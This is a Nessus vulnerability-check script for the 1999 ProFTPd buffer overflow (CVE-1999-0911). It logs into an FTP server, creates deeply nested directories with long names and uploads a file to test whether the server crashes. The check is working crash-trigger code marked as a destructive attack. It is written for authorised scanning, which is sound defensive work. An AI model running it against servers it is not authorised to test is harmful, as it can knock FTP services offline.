#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
# 
#
# See the Nessus Scripts License for details
#
#
# XXX not a duplicate with 10189 ! See http://www.linuxsecurity.com/advisories/linuxppc_advisory-251.html
#

if(description)
{
 script_id(10190);
 script_bugtraq_id(612);
 script_version ("$Revision: 1.26 $");
 script_cve_id("CVE-1999-0911");
 name["english"] = "ProFTPd buffer overflow";
 name["francais"] = "Dépassement de buffer ProFTPd";
 
 script_name(english:name["english"],
 	     francais:name["francais"]);
	     
 desc["english"] = "
It was possible to make the remote FTP server crash
by creating a huge directory structure and then
trying to upload a file to there.
This is usually called the 'proftpd buffer overflow'
even though it might affect other FTP servers.

It is very likely that an attacker can use this
flaw to execute arbitrary code on the remote 
server. This will give him a shell on your system,
which is not a good thing.

Solution : upgrade your FTP server.
Consider removing directories writable by 'anonymous'.

Risk factor : High";
		 
		 
desc["francais"] = "
Il s'est avéré possible de faire planter le serveur
FTP distant en y créant une grande structure de
répertoires puis en tentant d'y télécharger un fichier.

On appelle souvent ce problème le 'dépassement de buffer
proftpd' bien qu'il puisse concerner d'autres serveurs FTP.

Il est très probable qu'un pirate puisse utiliser ce
problème pour executer du code arbitraire sur le serveur
distant, ce qui lui donnera un shell sur votre système,
ce qui n'est pas une bonne chose.

Solution : mettez à jour votre ProFTPd en version 1.2pre4.
Si vous n'utilisez pas ProFTPd, alors informez votre 
votre vendeur de ce problème.

Facteur de risque : Elevé";	 	     
 script_description(english:desc["english"],
 		    francais:desc["francais"]);
		    
 
 script_summary(english:"Checks if the remote ftp can be buffer overflown",
 		francais:"Détermine si le serveur ftp distant peut etre soumis à un dépassement de buffer");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english:"FTP");
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
		  
 script_dependencie("find_service.nes", "ftp_writeable_directories.nasl", "wu_ftpd_overflow.nasl");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

include("ftp_func.inc");

#
# The script code starts here : 
#


login = get_kb_item("ftp/login");
pass  = get_kb_item("ftp/password");

# Then, we need a writeable directory
wri = get_kb_item("ftp/writeable_dir");
if(!wri)exit(0);

nomkdir = get_kb_item("ftp/no_mkdir");
if(nomkdir)exit(0);


port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(!get_port_state(port))exit(0);
soc = open_sock_tcp(port);
if(soc)
{
 if(ftp_authenticate(socket:soc, user:login, pass:pass))
 {
  c = string("CWD ", wri, "\r\n");
  send(socket:soc, data:c);
  b = ftp_recv_line(socket:soc);
  cwd = string("CWD ", crap(100), "\r\n");
  mkd = string("MKD ", crap(100), "\r\n");
  num_dirs = 0;
  for(i=0;i<9;i=i+1)
  {
  send(socket:soc, data:mkd);
  b = ftp_recv_line(socket:soc);
  if(!egrep(pattern:"^257 .*", string:b))
  {
   i = 9;
  }
  else
  {
   num_dirs = num_dirs + 1;
   send(socket:soc,data:cwd);
   b = ftp_recv_line(socket:soc);
   if(!egrep(pattern:"^250 .*", string:b))
    {
     i = 9;
    }
   }
  }
  
  
  port2 = ftp_pasv(socket:soc);
  soc2 = open_sock_tcp(port2);
  if(soc2)
  {
   command = string("STOR ", crap(100), "\r\n");
   send(socket:soc, data:command);
   b = ftp_recv_line(socket:soc);
   send(socket:soc2, data:crap(100));
   close(soc2);
   b = ftp_recv_line(socket:soc);
   command = string("HELP\r\n");
   send(socket:soc, data:command);
   b = ftp_recv_line(socket:soc);
   if(!b){
	security_hole(port);
   	exit(0);
	}
  ftp_close(socket:soc);
  
  
  if(!num_dirs)exit(0);
  
  soc = open_sock_tcp(port);
  if(!soc)exit(0);
  ftp_authenticate(socket:soc, user:login, pass:pass);
  for(i=0;i<num_dirs;i=i+1)
  {
   send(socket:soc, data:string("CWD ", crap(100), "\r\n"));
   b = ftp_recv_line(socket:soc);
  }
  
  
  send(socket:soc, data:string("DELE ", crap(100), "\r\n"));
  b = ftp_recv_line(socket:soc);
  send(socket:soc, data:string("CWD ..\r\n"));
  b = ftp_recv_line(socket:soc);
  for(i=0;i<num_dirs; i = i+1)
  {
   send(socket:soc, data:string("RMD ", crap(100), "\r\n"));
   b = ftp_recv_line(socket:soc);
   send(socket:soc, data:string("CWD ..\r\n"));
   b = ftp_recv_line(socket:soc);
  }
  
  ftp_close(socket:soc);
 }
}
}
